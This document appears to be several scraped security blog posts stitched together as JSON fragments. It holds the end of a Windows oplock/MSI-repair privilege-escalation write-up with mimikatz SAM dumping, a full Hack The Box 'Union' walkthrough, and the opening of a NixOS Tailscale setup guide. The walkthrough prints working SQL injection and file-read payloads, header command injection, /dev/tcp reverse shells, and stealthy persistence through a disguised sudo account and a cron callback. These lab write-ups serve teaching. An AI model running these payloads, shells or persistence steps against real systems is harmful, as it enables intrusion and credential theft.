prompt (the dialog is run by the SYSTEM browser, so the child inherits SYSTEM). Side Quest: What’s An oplock? An opportunistic lock (oplock) is a Windows file-system hint that lets a process “get ahead” of other readers/writers by caching or deferring I/O until someone else touches the same file. When another process (here: a SYSTEM service/helper during MSI repair) tries to access that file, the kernel asks the holder of the oplock to break it; i.e. either flush its state or release the handle, before the other I/O can continue. Tools like SetOpLock.exe open the exact log file and request an oplock; when the privileged helper later tries to write, the kernel issues a break request to the user’s tool, and the write is paused until the break is honored.\nThat pause is the whole trick. We aren’t “crashing” anything or racing unpredictably we’re deliberately telling Windows “hold that privileged write until I say so.” Because the write remains pending, the helper’s workflow doesn’t complete, and the visible SYSTEM console it spawned doesn’t exit. That gives us a calm, deterministic window to interact with the console’s Properties → Legacy console mode link, which launches the default browser in the same SYSTEM context. From there, using the browser’s open file dialog to run cmd.exe simply inherits that context.\nTwo practical nuances:\nYou must target the exact path the helper will touch in, this case C:\\Program Files\\PDF24\\faxPrnInst.log, and request the oplock before the privileged access occurs. This is why we setup the oplock before starting the msi repair. An oplock is not a brute force file lock. Windows is cooperating with us, and the other side will proceed the moment we release/break the lock. That’s why this is reliable: it’s a synchronization primitive, not a flaky race. Side Quest: Why do MSI Repairs Run As SYSTEM? Per-machine MSI installs are owned and orchestrated by the Windows Installer service (msiserver), which runs as LocalSystem. When a standard user kicks off a repair (e.g. like we did msiexec.exe /fa C:\\_install\\pdf24-creator-11.15.1-x64.msi the client UI may appear in their session, but the work, file writes, service actions, and any installer CustomActions configured to run without impersonation executes inside the service with full SYSTEM privileges. This means +no UAC prompt appears+ because the maintenance is performed by a trusted, already-elevated service on behalf of the user.\nWithin MSI semantics, this is expected. Immediate actions tied to UI can impersonate the caller, but deferred, no impersonate actions (or helper binaries spawned by them) intentionally run under the service’s SYSTEM token so they can touch protected areas like Program Files, HKLM, and driver/print subsystems. In this case, the vendor’s helper (pdf24-PrinterInstall.exe) is launched by msiserver in that privileged context.\nThis is very important: The vulnerability isn’t that it runs as SYSTEM, that’s normal for per-machine maintenance, but that it presents interactive UI (a visible console with a clickable help link) inside the user’s desktop. That UI boundary break is what lets a non-admin bridge from an elevated maintenance flow into an interactive SYSTEM session.\nDoes this mean that all MSI repairs are bad, no, they are not. Just remember an MSI repair has two parts: a user UI and a SYSTEM service. A repair is safe while the SYSTEM side stays headless however the moment it shows a clickable window, that window can become a direct bridge from the user’s desktop to SYSTEM.\nSide Quest: Why the link → Browser Hop Is The Pivot: When you click Properties → Legacy console mode in the visible SYSTEM console, Windows uses the shell (ShellExecute) to open a help URL. The shell resolves the default handler for http/https and launches that browser from the same security context as the caller. Because the caller here is a SYSTEM-owned console process, the browser initially receives the SYSTEM token unless the browser itself implements privilege dropping or a policy prevents this. However, modern browsers immediately apply sandboxing and privilege restrictions, creating a very narrow exploitation window.\nWhy Edge/IE Usually Won\u0026rsquo;t Give You A Clean SYSTEM Path:\nModern Edge/IE flows make this pivot effectively impossible. Edge (Chromium-based) maintains a multi-process, sandboxed model with a broker that aggressively normalizes to a user-level, medium-integrity context. Even if a stub instance briefly inherits SYSTEM, Edge implements Protected Mode and AppContainer isolation that automatically demotes process privileges regardless of the parent token. Internet Explorer (legacy) layers Protected Mode/AppContainer-style isolation with Mandatory Integrity Control, preventing any straightforward privilege escalation path.\nTwo practical gotchas contribute here:\nEdge\u0026rsquo;s single-instance/hand-off behavior reuses an already-running user instance, so your navigation ends up in the existing user-context browser rather than spawning a new SYSTEM process. Even when Edge receives an elevated token, its broker architecture and security boundaries ensure all content processes run at restricted integrity levels, completely blocking the attack chain. Why Chrome/Firefox Have Limited Vulnerability:\nChrome and Firefox will, when launched fresh by ShellExecute and no existing user instance is running, start a browser parent process that simply inherits the caller’s token. If the caller is the SYSTEM console, the browser’s parent process is SYSTEM. Crucially this means the Open File dialog (Ctrl+O) is owned by that parent process, so selecting or typing C:\\Windows\\System32\\cmd.exe or powershell.exe results in a child process of the browser, which inherits SYSTEM. No privilege drop, no broker hand-off to a user instance that’s why the PoC specifically nudges you toward Chrome/Firefox and away from Edge/IE.\nIt is worth noting that this is not a sure fire way to achieve privilege escalation as both Chrome \u0026amp; Firefox browsers rapidly apply token lowering and sandboxing mechanisms that severely limit the exploitation window. Meaning the Open File dialog (Ctrl+O) is NOT a direct path to SYSTEM execution 100% of the time this is because file operations are mediated through browser security policies that normalize privileges. While the parent process may initially have SYSTEM privileges, the browser\u0026rsquo;s internal security architecture prevents arbitrary process spawning at elevated privileges. The browsers implement:\nRapid privilege dropping from inherited tokens to restricted lockdown tokens Process isolation where sandboxed renderers cannot access elevated privileges Some useful links:\nSandboxing vs elevated browsing Chromium Design Sandbox Docs 5. Persistence: Now that we know why this works lets ensure we have persistence.\nFirst things first let\u0026rsquo;s drop into a powershell shell as cmd by default does not support UNC paths for directories which means we cannot access our mounted tools as easily.\npowershell Now we access our tools\ncd \\\\tsclient\\_tmp\\ We can use mimikatz to dump valuale information. If you have not got mimikatz you can get it here We run it\n.\\mimikatz.exe privilege::debug This will throw the below error as we are not running in the context of the administrator however we can still attack the SAM and extract hashes.\nERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 We then dump the SAM\nlsadump::sam As you can see we dump the administrator hash Lets verify this hash is valid, it is. Lessons Learned: What did I learn? I learned alot about oplock which was interesting. What silly mistakes did I make? Not too many again which was nice, mainly issues with my own system not the target. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n\u0026ndash; Bloodstiller\n\u0026ndash; Get in touch bloodstiller at bloodstiller dot com\n",

        "content": "Union Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Union How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: TCP:\n#Command nmap $box -Pn -oA TCPbasicScan #Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 06:41 BST Nmap scan report for 10.129.96.75 Host is up (0.024s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open https://app.hackthebox.com/machines/Union Nmap done: 1 IP address (1 host up) scanned in 8.40 seconds Initial thoughts: Only 80 open so we are going after that it would appear.\nComprehensive Scans: #Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results ┌─(...loodstiller/content-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/Union/scans/nmap)───(kali@kali:pts/3)─┐ └─(06:44:45 on main ✹ ✭)──\u0026gt; sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 06:44 BST Nmap scan report for 10.129.96.75 Host is up (0.027s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: nginx/1.18.0 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|router Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%) OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0 Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 166.40 seconds Findings: We can see the server is running: nginx 1.18.0 Ubuntu PHP (but no session ID is being set) Web 80: WhatWeb: Lets run WhatWeb to see if I can glean some further information.\n#Command whatweb http://$box | sed \u0026#39;s/, /\\n/g\u0026#39; #Output http://10.129.96.75 [200 OK] Bootstrap[4.1.1] Cookies[PHPSESSID] Country[RESERVED][ZZ] HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)] IP[10.129.96.75] JQuery[3.2.1] Script nginx[1.18.0] Results:\nAgain just seeing what we saw before in nmap. +Note+: I use sed to display the output across multiple lines for easier readability.\nDirbusting The Webserver Running Using FFUF: We can perform some directory busting to see if there are any interesting directories.\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ -ic Nothing of value was found. Enumerating Injection Points With Burpsuite: Web Enumeration via Burp Suite: When manually enumerating a Website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Finding An SQL Injection Point: Visiting the site we can see it allows us to check if a player is eligible for a qualifier. Looking at the code for the function on the page, by using inspect, we can see it\u0026rsquo;s a POST request that sends the data string player= + the string provided by the user using string concatenation. This unsanitized user input is being sent to index.php, which could potentially lead to SQL injection if the server-side code constructs database queries using this parameter without proper sanitization.\n$(function () { $(\u0026#39;form\u0026#39;).on(\u0026#39;submit\u0026#39;, function (e) { e.preventDefault(); $.ajax({ type: \u0026#39;post\u0026#39;, url: \u0026#39;index.php\u0026#39;, data: \u0026#39;player=\u0026#39; + document.getElementsByName(\u0026#39;player\u0026#39;)[0].value, async: true, success: function (data) { $(\u0026#39;#output\u0026#39;).html(\u0026#34;\u0026#34;); $(\u0026#39;#output\u0026#39;).append(data); } }); }); 2. Foothold: Using An SQL Union Injection Attack To Enumerate The Database: As we know the player string is being passed with string concatenation to construct it we can use this as a means to append another query onto the this query to enumerate the database.\nI used the standard query below to enumerate the version of SQL being run.\n\u0026#39; UNION SELECT @@version# If you are not familiar with SQLi UNION injection attacks here is a very brief overview to provide context.\n+Note+: Standard testing queries like using a single quote ' will not trigger an error in this specific instance. This could be because the application is handling single quotes in a way that prevents visible syntax errors, but still allows query modification through UNION SELECT.\nSide Quest: What is the UNION operator in SQL? The UNION operator allows us to combine two queries together. We can use it to add a malicious query to the end of a legitimate query used by the system.\nFor example we can assume from the code we have seen that our user input is taken in the \u0026ldquo;Player Eligibility Check\u0026rdquo; box and then run against the database using a query similar to the below (this is speculation, we cannot know the exact query being run, but we can infer).\n--Command SELECT player FROM eligiblePlayers WHERE name = \u0026#39;[ourInput]\u0026#39; --Example SELECT player FROM eligiblePlayers WHERE name = \u0026#39;test\u0026#39; We can then use the UNION operator to append a query onto this legitimate query.\n--Command \u0026#39; UNION SELECT [ourQuery]# --Example SELECT player FROM eligiblePlayers WHERE name = \u0026#39;\u0026#39; UNION SELECT @@version# Breakdown: ' closes the existing string. UNION SELECT starts the injected query. @@version returns the database version (works in MySQL \u0026amp; MS SQL). # comments out the rest of the original query. We can easily query what type of database is in use, by using the below strings.\nDatabase Type Query Microsoft, MySQL SELECT @@version Oracle SELECT * FROM v$version PostgreSQL SELECT version() As we can see from the handy table the string @@version works on both MySQL and Microsoft SQL, we can safely assume that as this is a Linux box it will be MySQL, however that is not guaranteed.\nIf you want to learn more about SQLi or web vulnerability testing in general I would recommend the free portswigger academy training .\nEstablishing How Many Columns The Query Original Query Has: We kind of skipped over this earlier, but when performing a UNION injection attack we first need to figure out how many columns the original query returns, because both queries must have the same number of columns.\nA UNION injection has two key requirements:\nSame number of columns: We must match the original query’s column count exactly. Compatible data types: Each column in the injected query must have a data type compatible with the original query. Since we’ve already successfully output the database version number, we know the original query has only one column. But let’s verify that by testing.\nTo verify this we can run the below query.\n\u0026#39; UNION SELECT NULL# NULL is a safe choice here because it can be implicitly cast to any data type, meaning it won’t cause type mismatch errors during testing. And as we can see from requirement 2 we need \u0026ldquo;Compatible data types\u0026rdquo;. The response says we are \u0026ldquo;not eligible due to already qualifying.”, which is odd, right? Most likely, the NULL value is being cast to a string and checked against a list of player names (our assumed target table).\nLets add another NULL to see if there is a second column (we know there is not but let\u0026rsquo;s do this so you can see what is happening.)\n\u0026#39; UNION SELECT NULL,NULl# The output changes again, which confirms what we suspected: the target query only returns one column.\nEnumerating Tables Using SQLi. Now that we know we have found an injection point and established the query has 1 column lets enumerate further. We already determined earlier that the original query returns 1 column, so our injected query also returns 1 column to match.\nMost databases, apart from Oracle, provide a special set of read-only views called the Information Schema. These contain metadata about the database such as tables, columns, etc. Oracle however, uses a different set of views (ALL_TABLES, USER_TABLES, DBA_TABLES).\nWe can use these views to view all the tables (and other information the database contains).\nWe can view the tables in the database by running the following query.\n\u0026#39; UNION SELECT TABLE_NAME FROM information_schema.tables# As we can see there is a table called ADMINISTRABLE_ROLE_AUTHORIZATIONS, but that is just an inbuilt table within MySQL. We can see a full list of inbuilt tables using MySQL\u0026rsquo;s documentation here here . However for ease here is screenshot showing only a fraction of the in built tables. As you can see there are a lot, however we can only see one, this is due to the output being one cell. Luckily we can use some handy tricks to get around this.\nUsing GROUP_CONCAT() to view all tables: As you saw there are lots of built in tables.\nOne option for us to view all the tables is use the LIMIT 1 OFFSET option.\n\u0026#39; UNION SELECT TABLE_NAME FROM information_schema.tables LIMIT 1 OFFSET 0# We can then increment the offset by a value of 1 to step through the list of tables.\n\u0026#39; UNION SELECT TABLE_NAME FROM information_schema.tables LIMIT 1 OFFSET 1# However that is going to take a LONG time and we would need to step through all the inbuilt tables still or guess where they end.\nInstead we can use the GROUP_CONCAT() function, which will allow us to group all the table names together concatenating them into one output, which is good as we have one cell.\n\u0026#39; UNION SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables# As we can see the string extends beyond the bounds of the site; if we take a look in burpsuite, we can see the complete list there. You may notice though near the end that there is a string that says \u0026ldquo;ROUTI\u0026rdquo; this is due to the fact that the GROUP_CONCAT(), in MySQL function having a default character limit length of 1024 characters.\n+Note+: If the database account has the required permissions, this limit can be increased to capture more results in a single output:\nSET SESSION group_concat_max_len = 32768; This can be especially helpful in CTFs or lab environments, but is less likely to work in hardened production systems.\nYou can also see that we have not even gotten past the inbuilt tables still.\nLuckily we can further refine this statement to exclude all built in tables by using the NOT IN clause.\nIn MySQL, the table_schema column in information_schema.tables represents the database schema that each table belongs to. By excluding the system schemas, mysql, information_schema, performance_schema and sys we can filter the results down to only user created tables.\n\u0026#39; UNION SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE table_schema NOT IN (\u0026#39;mysql\u0026#39;, \u0026#39;information_schema\u0026#39;, \u0026#39;performance_schema\u0026#39;, \u0026#39;sys\u0026#39;)# As you can see there are only two non default tables, flag \u0026amp; players\nEnumerating Column Names In Player \u0026amp; Flag Tables: Again we can use the GROUP_CONCAT() function to extract all column names at once.\n\u0026#39; UNION SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_name = \u0026#39;flag\u0026#39;# We can see there is a column called one\nLet\u0026rsquo;s check the players table columns now.\n\u0026#39; UNION SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_name = \u0026#39;players\u0026#39;# We can see this has a single column called player\nLet\u0026rsquo;s read the contents of these columns.\nExtracting Data From The Database Columns Via Union Injection? Again we can use the GROUP_CONCAT() function to extract all the data from the columns also.\n\u0026#39; UNION SELECT GROUP_CONCAT(player) FROM players# We can see it contains a list of registered players, we will take a note of these for later in case we need them.\nLet\u0026rsquo;s check the flag column data now.\n\u0026#39; UNION SELECT GROUP_CONCAT(one) FROM flag# This gives us the flag string for the challenge UHC{F1rst_5tep_2_Qualify}\nGetting SSH Access With The Flag String: If we enter a random name into the eligibility checker, we are provided a link to complete a challenge. If we click that link we are prompted to enter the first flag. If we enter the flag from the table We are given ssh access to the box.\n+Note+: If you go back to the box or have to get ssh access again after a prolonged period of time, re-enter the flag as it appears ssh access will timeout after a while.\nI try the usernames we are provided from the list however there is a password prompt \u0026amp; the flag or usernames do not work, so I think we need to dig a little further.\nLet\u0026rsquo;s see if we can read any of the files on the host via sqli.\nReading Host Files VIA SQLi: First lets establish if we can read from the host via the db, we will use a world readable file to do this, /etc/passwd\n\u0026#39; UNION SELECT LOAD_FILE(\u0026#34;/etc/passwd\u0026#34;)# We can read from the host!\nLooking at the output in burpsuite we can filter for the string sh and we can see that there are three interesting users, root, htb \u0026amp; uhc. Let\u0026rsquo;s keep digging and see what else we can find.\nEnumerating The Web Directory: As this is running nginx the typical folder structure for storing files is /var/www/html/[file].php\nSending the payload\n\u0026#39; UNION SELECT LOAD_FILE(\u0026#34;/var/www/html/index.php\u0026#34;)# We can see that there is some SQLMap mitigation logic as well as the actual query being run on the database.\nLet\u0026rsquo;s fuzz this to see what else we can find.\nFirst we will grab the relevant headers and cookies from the request.\n\u0026#34;X-Requested-With: XMLHttpRequest\u0026#34; \\ \u0026#34;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#34; \\ \u0026#34;Cookie: PHPSESSID=vdtvo4k8cnj42f08tq2fj7kcb0\u0026#34; \\ We do this as the PHPSESSID is required in order for us to interact with the\nWe can now construct our ffuf command.\nffuf \\ -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-words.txt:FUZZ \\ -u http://$box/index.php \\ -x http://127.0.0.1:8080 \\ -X POST \\ -d \u0026#34;player=\u0026#39; UNION SELECT LOAD_FILE(\u0026#39;/var/www/html/FUZZ.php\u0026#39;)#\u0026#34; \\ -H \u0026#34;X-Requested-With: XMLHttpRequest\u0026#34; \\ -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \\ -H \u0026#34;Cookie: PHPSESSID=vdtvo4k8cnj42f08tq2fj7kcb0\u0026#34; \\ -fw 10 When fuzzing this SQL injection payload with **ffuf**, we include these specific headers so that our requests look and behave like the legitimate requests the application expects.\nX-Requested-With: XMLHttpRequest Many web applications distinguish between normal page loads and AJAX (JavaScript) requests. This header is commonly sent by JavaScript frameworks like jQuery to signal that the request came from an AJAX call Without it, the server might return a full HTML page instead of the smaller JSON or partial HTML response we expect, or it might even block the request entirely.\nContent-Type: application/x-www-form-urlencoded This tells the server how the POST body is formatted. Since we’re sending form data (player=' UNION SELECT...), the server needs to know it’s URL-encoded form data rather than JSON or multipart data. Some servers reject POST data without the expected Content-Type.\nCookie: PHPSESSID=... This keeps our session alive. If the application requires authentication or session tracking, sending the PHPSESSID ensures our requests are processed with the correct permissions. Without it, we might get redirected to a login page or receive a “not authorized” error, breaking the fuzzing process.\nWhy all this matters for fuzzing The goal is to test only the part of the request we’re fuzzing—in this case, the filename inside LOAD_FILE('/var/www/html/FUZZ.php'). If we don’t send the same headers the browser normally would, we might get false negatives because the server rejects our requests before they even reach the vulnerable code. By replicating a valid, working request exactly (headers, cookies, format), we ensure our fuzz results reflect real server behavior.\nWe get alot of hits, but the main one that appears the most interesting is the standard config.php Finding Credentials in config.php: Checking the file in burpsuite we can see the credentials for the user uhc These credentials are used for the connecting to the database. uhc-11qual-global-pw\nLet\u0026rsquo;s test them for SSH access to ensure they work. They do.\nLet\u0026rsquo;s grab our user flag. 3. Privilege Escalation: Looking around as our user there is not much we can do. We cannot access sudo and there are no new interesting files.\nWe can also access the htb user\u0026rsquo;s home directory but there is nothing of note there either.\nLet\u0026rsquo;s go back to what we do know, the files in the web directory.\nFinding A Sudo Call in firewall.php: Looking at firewall.php we can see the below lines.\n\u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $ip = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } else { $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; }; system(\u0026#34;sudo /usr/sbin/iptables -A INPUT -s \u0026#34; . $ip . \u0026#34; -j ACCEPT\u0026#34;); ?\u0026gt; The most interesting part here is the sudo call to iptables. It’s adding our IP address to the ACCEPT list, so we can SSH in after submitting the flag.\nNotice how it takes the IP address from the HTTP_X_FORWARDED_FOR variable with no input sanitization. This means we may be able to craft a malicious payload that injects extra commands, resulting in command injection via unsanitized header input.\nSide Quest: What is HTTP_X_FORWARDED_FOR doing? HTTP_X_FORWARDED_FOR is a PHP server environment variable that contains the value of the X-Forwarded-For HTTP header. It’s often used to record the original client IP address when the request passes through a proxy or load balancer.\nWe can find out more information about the header by checking Mozilla\u0026rsquo;s documentation here we can see it says.\nThe HTTP X-Forwarded-For (XFF) request header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server.\nBut why is this dangerous? I am so glad you asked! Because the X-Forwarded-For header is controlled by the client, which means us as an attacker can insert arbitrary text. Without sanitization, that text gets concatenated into the system() call, and when sudo runs it, the injected command runs with elevated privileges.\nCrafting Our POC Payload: For a simple POC we are going to use a curl command to grab the contents of a python http server we control.\nSetup our Server: First of all lets setup our python http server.\npython3 -m http.server 9000 Crafting The Malicious Payload: The vulnerable PHP code runs:\nsystem(\u0026#34;sudo /usr/sbin/iptables -A INPUT -s \u0026#34; . $ip . \u0026#34; -j ACCEPT\u0026#34;); Since $ip comes directly from the X-Forwarded-For header, we can inject extra commands after a valid IP address.\nWe want to run: curl http://[ourServer]:9000/POC\nAs we are inserting our payload into the existing command string, we need to be very specific with our syntax.\nProvide a valid IP address: The PHP code is expecting an IP address, so we start with ours: 10.10.14.22\nAppend a command separator: We use the ; operator to terminate the IP argument and start a new command: 10.10.14.22;\nCall bash to spawn a subshell: Using bash -c allows us to run our payload inside a separate process for more control: 10.10.14.22; bash -c\nAdd the actual curl command: This is the command we want to execute: 10.10.14.22; bash -c \u0026quot;curl http://10.10.14.22:9000/POC\u0026quot;\nRedirect input to prevent hangs: We send any errors to stderr using 0\u0026lt;\u0026amp;1 so the request doesn\u0026rsquo;t hang if there’s a problem: 10.10.14.22; bash -c \u0026quot;curl http://10.10.14.22:9000/POC 0\u0026lt;\u0026amp;1\u0026quot;\nAppend another ; so the rest of the original command runs: This ensures the iptables command completes as intended: 10.10.14.22; bash -c \u0026quot;curl http://10.10.14.22:9000/POC 0\u0026lt;\u0026amp;1\u0026quot;;\nWhen the PHP code runs, the final system command looks like this:\nsystem(\u0026#34;sudo /usr/sbin/iptables -A INPUT -s \u0026#34; . 10.10.14.22; bash -c \u0026#34;curl http://10.10.14.22:9000/POC 0\u0026lt;\u0026amp;1\u0026#34;; . \u0026#34; -j ACCEPT\u0026#34;); Sending Our Payload: Now we need to intercept a GET request from the site to firewall.php so we can pass this. Let\u0026rsquo;s go back to burp.\nWe navigate to http://10.129.96.75/challenge.php and enter the flag UHC{F1rst_5tep_2_Qualify} we retrieved via SQLi Union Injection earlier to trigger the post request to add our IP to the host.\nIn burp we can press CTRL+R and send to repeater. We are going to insert out payload\nx-forwarded-for: 10.10.14.22; bash -c \u0026#34;curl http://10.10.14.22:9000/POC 0\u0026lt;\u0026amp;1\u0026#34;; We can see we get a response straight away and it connects so we have command execution. If you want you can also see it rendered on the page too. Getting A Reverse Shell Via Header Command Injection: Using the same format as before we should be able to get a reverse shell.\nLet\u0026rsquo;s start our listener.\nnc -nvlp 80 And send our payload.\nx-forwarded-for: 10.10.14.22; bash -c \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.22/80 0\u0026gt;\u0026amp;1\u0026#34;; We get our shell as the user www-data.\nThe shell is pretty unstable so let\u0026rsquo;s upgrade it using python.\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Elevating To root Via Overly Permissive sudo Permissions: If we check what commands the user www-data using can run as root using sudo -l we can see that they can run all commands without a password. This means we can easily switch to a root shell using\nsudo /bin/bash Let\u0026rsquo;s get our flag 4. Persistence: It wouldn\u0026rsquo;t be a write up without some simple form of persistence would it?\nCreating a high privileged \u0026ldquo;service\u0026rdquo; account for persistence: We can create an account called \u0026ldquo;nginx\u0026rdquo; and give ourselves root privileges \u0026amp; access to the bash shell. We will use this name as it\u0026rsquo;s one you could see on a machine and will raise less suspicion.\nsudo useradd -m -s /bin/bash nginx Creates a new user named nginx. -m: Creates a home directory for the user. -s /bin/bash: Sets the user\u0026rsquo;s default shell to /bin/bash. sudo usermod -aG sudo nginx Adds the nginx user to the sudo group. -a: Appends the user to the group (avoids overwriting existing groups). -G sudo: Specifies the sudo group. sudo passwd nginx Sets or updates the password for the nginx user. Prompts us to add a new password and confirms it. Let\u0026rsquo;s switch to the newly created user to ensure it works.\nsu nginx Let\u0026rsquo;s check we have sudo privileges.\nsudo -l Let\u0026rsquo;s ensure we can actually read sudo level files by reading /etc/shadow As we can see we do.\nCreating a cron job reverse shell: Having a high privilege user is good and all but not ideal if we can\u0026rsquo;t access it due to ip whitelisting, so instead let\u0026rsquo;s create a cronjob reverse shell….I know, I know we could update iptables, but where is the fun in that?\n(crontab -l \u0026gt; .tab ; echo \u0026#34;* * * * * /bin/bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.22/53 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; .tab ; crontab .tab ; rm .tab) \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 We will set it to run every 1 minute and also use port 53 (DNS) so it blends in. Let\u0026rsquo;s verify it\u0026rsquo;s in the crontab by running crontab -l As we can see it\u0026rsquo;s running.\nI start my listener and get a connection back after 1 minute. +Note+: This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect. Lessons Learned: What did I learn? This was mainly done to re-cement some more SQLi studying I have done recently as I am working my way through the portswigger academy training and this was a great way to drill that down so it helped alot. I learned alot about header injection, which is fairly new to me. What silly mistakes did I make? I didn\u0026rsquo;t output to stderr when creating my initial command injection curl command and could not figure out why it wasn\u0026rsquo;t working, then it dawned on me. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",

    },

        "title": "Autostart Tailscale on NixOS system boot \u0026 rebuild with mullvad integration",
        "tags": ["nixos","tailscale","homelab","networking","vpn","system","configuration",],
        "content": "This was originally posted on 2025-02-23 however I have since added the mullvad integration into this so have updated the guide to reflect this.\n+Note+: You do not need the mullvad integration for this to work, I have highlighted the arguments to add if you are going to use mullvad. Are you tired of running sudo tailscale up every time you login, I know I am. So I thought why spend under two seconds waiting for something to run and using auto complete with ZSH to easily find the command when I can easily create a service that launches Tailscale on boot for me and re-launches on every rebuild of the system.\nThis configuration will ensure that:\nTailscale starts automatically with your system. You don\u0026rsquo;t need to manually authenticate each time. Your authentication key is stored securely using sops /sops-nix The connection is established only when needed (won\u0026rsquo;t try to reconnect if already connected). All non lan traffic is routed over mullvad. This assumes you already have a Tailscale account with the mullvad extension and sops setup, if you don\u0026rsquo;t please see guides below.\nTailscale quick start guide Install sops-nix Generating The Tailscale Auth Key: As we want to automate the process of authenticating of connecting our NixOS host to the Tailscale network we will need to generate an auth key. This will mean we do not have to follow the provided Tailscale links when adding the host to the network or re-authorizing. +Note+: Even if you have already added your host to the Tailscale network this process is still the same. Login to your account and click \u0026ldquo;Settings\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Personal Settings\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Keys\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Generate Auth Key\u0026rdquo;\nKey settings, give your key a memorable name and also set it for the amount of time you want it to be valid for, I have set it for the max 90 days have added a reminder to my todo list to regenerate one in 85 days.\nYou should now have a Tailscale auth key.\nAdding Tailscale Auth Key To Sops: It\u0026rsquo;s now time to add our Tailscale Auth Key to sops so our system has access to it.\n# If your sops file is called something different obviously you need to enter that... sops secrets.yaml # Store it in this format is important as we will be calling it later as a variable tailscale_preauth: | TAILSCALE_AUTH_KEY=tskey-auth-xxxxx-xxxxxxxxxxxxx +Note+: It is also possible to use age for this however I personally use stops as it also allows integration with home-manager. Edit your configuration.nix and add the secret so it\u0026rsquo;s accessible by other services.\nsops = { defaultSopsFile = ./packages/sops/secrets.yaml; age.keyFile = \u0026#34;/home/martin/.config/sops/age/keys.txt\u0026#34;; # I have other sops secerts here but have removed for brevity secrets.tailscale_preauth = { }; }; +Important+: The part secrets.tailscale_preauth has to match name that was placed into the sops secrets.yaml as this is the key for the value referenced. So if in your sops secrets file you called it ts-key you would write secrets.ts-key +Note+: This has to be done in configuration.nix \u0026amp; not home-manager as this is a system wide service that is running and not a user specific service. Choosing a mullvad exit node for tailscale. If you are planning on using mullvad please ensure you add the service (it\u0026rsquo;s chargeable) by following the tailscale documentation here .\nYou will also need to select an exit node. You can do this by running one of the following commands.\n# Get list of exit nodes tailscale exit-node list # Get a list of exit nodes by country tailscale exit-node list --filter=[country name] #Example tailscale exit-node list --filter=USA # You can 